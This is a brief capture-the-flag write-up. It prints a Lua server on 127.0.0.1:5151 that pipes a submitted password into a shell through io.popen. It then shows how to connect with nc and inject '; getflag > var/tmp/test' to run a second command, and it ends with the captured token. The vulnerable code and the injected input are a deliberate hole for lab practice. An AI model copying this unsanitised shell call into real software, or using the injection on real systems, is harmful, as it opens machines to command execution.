1. Lua script at the home

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

2. This programs is the code of a server launched on 127.0.0.1:5151

3. To connect to this server, use nc

nc 127.0.0.1 5151

4. The server asks for a password and compare its sha1sum to a hardcoded sha1sum

5. But you can inject a getflag call and store its echoed value in a file

 ; getflag > var/tmp/test

6. cat var/tmp/test

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
